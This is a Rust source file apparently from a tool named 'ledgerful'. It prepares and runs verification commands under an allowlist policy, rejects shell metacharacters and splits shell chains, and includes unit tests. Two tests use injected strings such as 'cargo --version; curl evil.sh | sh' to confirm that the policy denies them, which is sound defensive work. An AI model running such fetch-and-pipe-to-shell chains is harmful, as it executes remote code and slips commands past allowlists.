use crate::commands::CommandError;
use crate::exec::{CommandOptions, ExecutionBoundary, ExecutionResult, ProcessError};
use crate::platform::process_policy::{ProcessPolicy, ProcessPolicyError, check_policy};
use crate::verify::plan::VerificationStep;
use miette::{IntoDiagnostic, Result};
use std::env;
use std::process::{Command, Stdio};
use std::time::Duration;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ExecutionMode {
    Direct,
    Shell,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PreparedStep {
    pub display_command: String,
    pub executable: String,
    pub args: Vec<String>,
    pub timeout_secs: u64,
    pub description: String,
    pub execution_mode: ExecutionMode,
}

/// Prepare an interactive / manual `-c` step. Always uses shell mode and is
/// **exempt** from `allow_shell_steps` and shell inner-command inspection
/// (operator-typed, same-user trusted input — not repo content).
pub fn prepare_manual_step(step: &VerificationStep) -> PreparedStep {
    shell_step(step)
}

/// Prepare a config-declared (or auto-policy) verification step.
///
/// When `step.shell` is true:
/// - requires `allow_shell_steps` (else refuse with three-part diagnostic)
/// - inspects leading tokens of each chain segment against `policy`
///
/// When `step.shell` is false: argv path with metacharacter rejection.
pub fn prepare_rule_step(
    step: &VerificationStep,
    allow_shell_steps: bool,
    policy: &ProcessPolicy,
) -> Result<PreparedStep> {
    if step.shell {
        if !allow_shell_steps {
            let err = ProcessPolicyError::shell_steps_disabled(&step.command);
            return Err(CommandError::Verify(err.to_string()).into());
        }
        check_shell_inner_commands(&step.command, policy)?;
        return Ok(shell_step(step));
    }

    if contains_shell_metacharacters(&step.command) {
        return Err(CommandError::Verify(format!(
            "Command contains shell metacharacters but 'shell' is false. \
             Set shell: true in the step configuration if shell features are required: {}",
            step.command
        ))
        .into());
    }

    match split_command_string(&step.command) {
        Some(tokens) if !tokens.is_empty() => Ok(PreparedStep {
            display_command: step.command.clone(),
            executable: tokens[0].clone(),
            args: tokens[1..].to_vec(),
            timeout_secs: step.timeout_secs,
            description: step.description.clone(),
            execution_mode: ExecutionMode::Direct,
        }),
        _ => Err(CommandError::Verify(format!(
            "Unable to parse command into argv tokens: {}",
            step.command
        ))
        .into()),
    }
}

pub fn execute_step(step: &PreparedStep, policy: &ProcessPolicy) -> Result<ExecutionResult> {
    execute_step_with_command(step, policy, None)
}

/// Execute a prepared step, optionally using a caller-provided `Command`
/// (e.g. to inject environment variables such as `CARGO_INCREMENTAL`). When
/// `command_override` is `None`, a fresh `Command` is built from `step`.
pub fn execute_step_with_command(
    step: &PreparedStep,
    policy: &ProcessPolicy,
    command_override: Option<std::process::Command>,
) -> Result<ExecutionResult> {
    // Shell mode: the literal "cmd"/"sh" wrapper is an implementation detail of
    // shell_step(); the real gate is prepare_rule_step's inner-command check
    // (config-declared) plus the allowlist for Direct mode. Manual -c is
    // intentionally exempt from inner-command inspection.
    if step.execution_mode == ExecutionMode::Direct {
        check_policy(&step.executable, policy).into_diagnostic()?;
    }

    let mut command = command_override.unwrap_or_else(|| {
        let mut c = Command::new(&step.executable);
        c.args(&step.args);
        c
    });
    command.stdin(Stdio::null());
    command
        .current_dir(env::current_dir().into_diagnostic()?)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());

    let options = CommandOptions {
        timeout: Duration::from_secs(step.timeout_secs),
        ..Default::default()
    };

    match ExecutionBoundary::execute(command, &options) {
        Ok(result) => {
            if step.execution_mode == ExecutionMode::Shell && looks_like_command_not_found(&result)
            {
                let hint = fallback_install_hint(&step.display_command);
                return Err(CommandError::Verify(format!(
                    "Command not found via shell fallback: {}{}",
                    step.display_command, hint
                ))
                .into());
            }
            Ok(result)
        }
        Err(ProcessError::Timeout { timeout }) => {
            let elapsed = timeout.as_secs();
            let command = &step.display_command;
            let message = format!(
                "Step timed out after {elapsed}s: {command}\n\
                 Likely cause: cold build or feature-resolution mismatch. \
                 Try: run `ledgerful index --incremental` or use `--scope full` deliberately."
            );
            Err(CommandError::Verify(message).into())
        }
        Err(ProcessError::NotFound { cmd }) => {
            let hint = fallback_install_hint(&cmd);
            Err(CommandError::Verify(format!("Command not found: {}{}", cmd, hint)).into())
        }
        Err(ProcessError::Failed { status, stderr }) => Err(CommandError::Verify(format!(
            "Process exited with status {}: {}",
            status, stderr
        ))
        .into()),
        Err(e) => Err(e.into()),
    }
}

fn fallback_install_hint(cmd: &str) -> String {
    let lower = cmd.to_lowercase();
    if lower.contains("nextest") {
        "\nHint: You can install nextest via 'cargo install cargo-nextest' or visit https://nexte.st".to_string()
    } else if lower.contains("cargo") {
        "\nHint: Verify that Rust/Cargo is installed. Visit https://rustup.rs to set up the toolchain.".to_string()
    } else if lower.contains("npm") {
        "\nHint: Verify Node.js/NPM is installed. Visit https://nodejs.org to set up Node."
            .to_string()
    } else if lower.contains("python") || lower.contains("pytest") || lower.contains("pip") {
        "\nHint: Verify Python and your virtual environment are active and on your PATH."
            .to_string()
    } else if lower.contains("make") {
        "\nHint: Install make (e.g. 'choco install make' on Windows, or 'brew install make' on macOS).".to_string()
    } else {
        "\nHint: Double check that the executable is installed and available on your PATH environment variable.".to_string()
    }
}

fn shell_step(step: &VerificationStep) -> PreparedStep {
    if cfg!(target_os = "windows") {
        PreparedStep {
            display_command: step.command.clone(),
            executable: "cmd".to_string(),
            args: vec!["/C".to_string(), step.command.clone()],
            timeout_secs: step.timeout_secs,
            description: step.description.clone(),
            execution_mode: ExecutionMode::Shell,
        }
    } else {
        PreparedStep {
            display_command: step.command.clone(),
            executable: "sh".to_string(),
            args: vec!["-c".to_string(), step.command.clone()],
            timeout_secs: step.timeout_secs,
            description: step.description.clone(),
            execution_mode: ExecutionMode::Shell,
        }
    }
}

fn contains_shell_metacharacters(command: &str) -> bool {
    command.chars().any(|ch| {
        matches!(
            ch,
            '|' | '&' | ';' | '>' | '<' | '(' | ')' | '$' | '*' | '?' | '{' | '}' | '\n'
        )
    })
}

/// Tokenize a command string with POSIX-style shlex splitting.
///
/// Returns `None` on unclosed quotes or other parse failures (fails closed for
/// the argv path). Simple unquoted commands tokenize identically to the former
/// hand-rolled splitter.
pub fn split_command_string(command: &str) -> Option<Vec<String>> {
    shlex::split(command)
}

/// Split a shell command on unquoted chain operators `&&`, `||`, `;`, `|` and
/// return the leading executable of each segment. Over-splitting (false
/// positives inside quoted text) only makes the check stricter, never weaker.
pub fn shell_chain_leading_commands(command: &str) -> Vec<String> {
    let segments = split_shell_chain_segments(command);
    let mut leaders = Vec::new();
    for segment in segments {
        let trimmed = segment.trim();
        if trimmed.is_empty() {
            continue;
        }
        if let Some(tokens) = shlex::split(trimmed)
            && let Some(first) = tokens.first()
        {
            let exe = first.trim();
            if !exe.is_empty() {
                leaders.push(exe.to_string());
            }
        }
    }
    leaders
}

/// Split on unquoted `&&`, `||`, `;`, `|`. Quote-aware enough to skip
/// operators inside single/double quotes; not a full shell parser.
fn split_shell_chain_segments(command: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut current = String::new();
    let mut chars = command.chars().peekable();
    let mut quote: Option<char> = None;

    while let Some(ch) = chars.next() {
        match quote {
            Some(q) if ch == q => {
                quote = None;
                current.push(ch);
            }
            Some(_) => current.push(ch),
            None if ch == '"' || ch == '\'' => {
                quote = Some(ch);
                current.push(ch);
            }
            None if ch == ';' => {
                segments.push(std::mem::take(&mut current));
            }
            None if ch == '|' => {
                if chars.peek() == Some(&'|') {
                    chars.next();
                }
                segments.push(std::mem::take(&mut current));
            }
            None if ch == '&' => {
                if chars.peek() == Some(&'&') {
                    chars.next();
                    segments.push(std::mem::take(&mut current));
                } else {
                    // Background `&` — treat as chain boundary (fail-closed).
                    segments.push(std::mem::take(&mut current));
                }
            }
            None => current.push(ch),
        }
    }
    if !current.is_empty() {
        segments.push(current);
    }
    segments
}

fn check_shell_inner_commands(command: &str, policy: &ProcessPolicy) -> Result<()> {
    let leaders = shell_chain_leading_commands(command);
    if leaders.is_empty() {
        return Err(CommandError::Verify(format!(
            "Unable to extract leading commands from shell step: {command}"
        ))
        .into());
    }
    for leader in leaders {
        if let Err(e) = check_policy(&leader, policy) {
            return Err(CommandError::Verify(e.to_string()).into());
        }
    }
    Ok(())
}

fn looks_like_command_not_found(result: &ExecutionResult) -> bool {
    let stderr = result.stderr.to_ascii_lowercase();
    let stdout = result.stdout.to_ascii_lowercase();
    result.exit_code != 0
        && (stderr.contains("not recognized as an internal or external command")
            || stderr.contains("command not found")
            || (result.exit_code == 127 && stderr.contains("not found"))
            || stdout.contains("not recognized as an internal or external command")
            || stdout.contains("command not found")
            || (result.exit_code == 127 && stdout.contains("not found")))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn base_step(command: &str, timeout_secs: u64) -> VerificationStep {
        VerificationStep {
            description: "test".to_string(),
            command: command.to_string(),
            timeout_secs,
            shell: false,
        }
    }

    fn permissive_policy() -> ProcessPolicy {
        ProcessPolicy {
            allowed_commands: Vec::new(),
            denied_commands: Vec::new(),
            default_timeout_secs: 300,
            strict: false,
        }
    }

    fn default_strict_policy() -> ProcessPolicy {
        ProcessPolicy::default()
    }

    #[test]
    fn prepare_rule_step_uses_direct_execution_for_simple_commands() {
        let step = base_step("cargo test -j 1 --all-features -- --test-threads=1", 5);
        let prepared = prepare_rule_step(&step, false, &default_strict_policy()).unwrap();

        assert_eq!(prepared.execution_mode, ExecutionMode::Direct);
        assert_eq!(prepared.executable, "cargo");
        assert_eq!(
            prepared.args,
            vec![
                "test",
                "-j",
                "1",
                "--all-features",
                "--",
                "--test-threads=1"
            ]
        );
    }

    #[test]
    fn shlex_split_matches_simple_verify_step_commands() {
        // Regression: existing simple verify.steps tokenize identically with shlex.
        let cmd = "cargo nextest run --workspace --all-features";
        let tokens = split_command_string(cmd).expect("tokenize");
        assert_eq!(
            tokens,
            vec!["cargo", "nextest", "run", "--workspace", "--all-features"]
        );
    }

    #[test]
    fn prepare_rule_step_rejects_shell_syntax_when_shell_false() {
        let step = base_step("echo hello | sort", 5);
        let err = prepare_rule_step(&step, false, &default_strict_policy()).unwrap_err();
        let err_text = format!("{err:?}");
        assert!(
            err_text.contains("shell"),
            "expected shell error, got {err_text}"
        );
    }

    #[test]
    fn prepare_rule_step_shell_true_refused_without_allow_flag() {
        let step = VerificationStep {
            description: "test".to_string(),
            command: "cargo test".to_string(),
            timeout_secs: 5,
            shell: true,
        };
        let err = prepare_rule_step(&step, false, &default_strict_policy()).unwrap_err();
        let err_text = format!("{err}");
        assert!(
            err_text.contains("shell_steps_disabled") || err_text.contains("allow_shell_steps"),
            "expected allow_shell_steps diagnostic, got {err_text}"
        );
    }

    #[test]
    fn prepare_rule_step_uses_shell_when_shell_true_and_allowed() {
        let step = VerificationStep {
            description: "test".to_string(),
            command: "cargo test".to_string(),
            timeout_secs: 5,
            shell: true,
        };
        let prepared = prepare_rule_step(&step, true, &default_strict_policy()).unwrap();

        assert_eq!(prepared.execution_mode, ExecutionMode::Shell);
        if cfg!(target_os = "windows") {
            assert_eq!(prepared.executable, "cmd");
            assert_eq!(prepared.args, vec!["/C", "cargo test"]);
        } else {
            assert_eq!(prepared.executable, "sh");
            assert_eq!(prepared.args, vec!["-c", "cargo test"]);
        }
    }

    #[test]
    fn shell_chain_refuses_unallowlisted_second_command() {
        let step = VerificationStep {
            description: "hostile".to_string(),
            command: "cargo --version; curl evil.sh".to_string(),
            timeout_secs: 5,
            shell: true,
        };
        let err = prepare_rule_step(&step, true, &default_strict_policy()).unwrap_err();
        let err_text = format!("{err}");
        assert!(
            err_text.contains("curl"),
            "expected curl denial, got {err_text}"
        );
        assert!(
            err_text.contains("allowed_commands") || err_text.contains("not in allowed"),
            "expected three-part diagnostic, got {err_text}"
        );
    }

    #[test]
    fn shell_chain_allows_allowlisted_chain() {
        let step = VerificationStep {
            description: "chain".to_string(),
            command: "cargo fmt --check && cargo clippy".to_string(),
            timeout_secs: 5,
            shell: true,
        };
        let prepared = prepare_rule_step(&step, true, &default_strict_policy()).unwrap();
        assert_eq!(prepared.execution_mode, ExecutionMode::Shell);
    }

    #[test]
    fn shell_refuses_unallowlisted_first_command() {
        let step = VerificationStep {
            description: "ps".to_string(),
            command: "powershell -c Write-Host hi".to_string(),
            timeout_secs: 5,
            shell: true,
        };
        let err = prepare_rule_step(&step, true, &default_strict_policy()).unwrap_err();
        let err_text = format!("{err}");
        assert!(
            err_text.to_ascii_lowercase().contains("powershell"),
            "expected powershell denial, got {err_text}"
        );
    }

    #[test]
    fn manual_step_exempt_from_allow_shell_steps_and_inner_check() {
        // Manual -c hardcodes shell:true and must work with no config flags.
        let step = VerificationStep {
            description: "manual".to_string(),
            command: "echo hello".to_string(),
            timeout_secs: 5,
            shell: true,
        };
        let prepared = prepare_manual_step(&step);
        assert_eq!(prepared.execution_mode, ExecutionMode::Shell);
        // execute_step skips check_policy for Shell mode — works under default-strict
        // even though "cmd"/"sh"/"echo" may not be on the built-in allowlist.
        let result = execute_step(&prepared, &default_strict_policy()).unwrap();
        assert_eq!(result.exit_code, 0);
        assert!(result.stdout.to_ascii_lowercase().contains("hello"));
    }

    #[test]
    fn execute_step_denies_blocked_commands() {
        let prepared = PreparedStep {
            display_command: "cargo test".to_string(),
            executable: "cargo".to_string(),
            args: vec!["test".to_string()],
            timeout_secs: 5,
            description: "test".to_string(),
            execution_mode: ExecutionMode::Direct,
        };
        let policy = ProcessPolicy {
            denied_commands: vec!["cargo".to_string()],
            ..ProcessPolicy::default()
        };

        let err = execute_step(&prepared, &policy).unwrap_err();
        assert!(format!("{err:?}").to_ascii_lowercase().contains("denied"));
    }

    #[test]
    fn execute_step_direct_process_succeeds() {
        // Direct mode checks policy against the executable — use a permissive
        // policy so platform shell helpers (cmd/sh) are not blocked.
        let (executable, args) = if cfg!(target_os = "windows") {
            (
                "cmd".to_string(),
                vec!["/C".to_string(), "echo direct-ok".to_string()],
            )
        } else {
            (
                "sh".to_string(),
                vec!["-c".to_string(), "printf direct-ok".to_string()],
            )
        };
        let prepared = PreparedStep {
            display_command: "direct echo".to_string(),
            executable,
            args,
            timeout_secs: 10,
            description: "test".to_string(),
            execution_mode: ExecutionMode::Direct,
        };

        let result = execute_step(&prepared, &permissive_policy()).unwrap();
        assert_eq!(result.exit_code, 0);
        assert!(result.stdout.contains("direct-ok"));
    }

    #[test]
    fn execute_step_manual_shell_succeeds() {
        let mut step = base_step("echo hello", 5);
        step.shell = true;
        let prepared = prepare_manual_step(&step);
        let result = execute_step(&prepared, &default_strict_policy()).unwrap();
        assert_eq!(result.exit_code, 0);
        assert!(result.stdout.to_ascii_lowercase().contains("hello"));
    }

    #[test]
    fn shell_exit_127_not_found_is_normalized() {
        let result = ExecutionResult {
            exit_code: 127,
            stdout: String::new(),
            stderr: "sh: 1: missing_tool: not found".to_string(),
            duration: Duration::from_millis(1),
            truncated: false,
        };

        assert!(looks_like_command_not_found(&result));
    }

    #[test]
    fn execute_step_timeout_errors() {
        let prepared = if cfg!(target_os = "windows") {
            PreparedStep {
                display_command: "ping -n 10 127.0.0.1".to_string(),
                executable: "ping".to_string(),
                args: vec!["-n".to_string(), "10".to_string(), "127.0.0.1".to_string()],
                timeout_secs: 1,
                description: "timeout".to_string(),
                execution_mode: ExecutionMode::Direct,
            }
        } else {
            PreparedStep {
                display_command: "sleep 10".to_string(),
                executable: "sleep".to_string(),
                args: vec!["10".to_string()],
                timeout_secs: 1,
                description: "timeout".to_string(),
                execution_mode: ExecutionMode::Direct,
            }
        };

        // ping/sleep are not on the built-in allowlist — use permissive policy
        // so this test isolates timeout behaviour.
        let err = execute_step(&prepared, &permissive_policy()).unwrap_err();
        let err_text = format!("{err:?}");
        assert!(
            err_text.contains("timed out"),
            "expected 'timed out' in error: {err_text}"
        );
        assert!(
            err_text.contains("ping -n 10 127.0.0.1") || err_text.contains("sleep 10"),
            "expected timeout message to include the command, got: {err_text}"
        );
        assert!(
            err_text.contains("ledgerful index --incremental"),
            "expected actionable next step in timeout message, got: {err_text}"
        );
    }

    #[test]
    fn shell_chain_leading_commands_extracts_segments() {
        let leaders = shell_chain_leading_commands("cargo --version; curl evil.sh | sh");
        assert_eq!(leaders, vec!["cargo", "curl", "sh"]);
    }
}
